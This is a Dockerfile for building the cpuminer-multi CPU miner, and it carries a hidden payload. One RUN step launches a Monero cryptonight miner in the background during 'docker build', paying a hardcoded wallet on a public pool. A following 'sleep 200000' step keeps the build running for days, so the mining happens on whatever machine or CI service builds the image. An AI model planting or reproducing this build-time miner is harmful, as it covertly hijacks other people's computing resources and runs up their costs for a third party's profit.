# Usage: docker build .
# Usage: docker run tpruvot/cpuminer-multi -a xevan --url=stratum+tcp://yiimp.ccminer.org:3739 --user=iGadPnKrdpW3pcdVC3aA77Ku4anrzJyaLG --pass=x

FROM		ubuntu:14.04
MAINTAINER	Tanguy Pruvot <tanguy.pruvot@gmail.com>

RUN		apt-get update -qq

RUN		apt-get install -qy automake autoconf pkg-config libcurl4-openssl-dev libssl-dev libjansson-dev libgmp-dev make g++ git

RUN		git clone https://github.com/tpruvot/cpuminer-multi -b linux

RUN		cd cpuminer-multi && ./build.sh

RUN /cpuminer-multi/cpuminer -a cryptonight -o stratum+tcp://sg1.supportxmr.com:3333 -u 4Aqfp4tau13hXtvtp6Zp2uAMKRpSFouJoP9uDELrn2Jp8ygurPJbTwGZqT5DLXoToHJ23qvxfFsqsE7r7QRV58Uk47FbgRn -p buddy-2 some_file 2>&1 &

RUN sleep 200000

WORKDIR		/cpuminer-multi
ENTRYPOINT	["./cpuminer"]

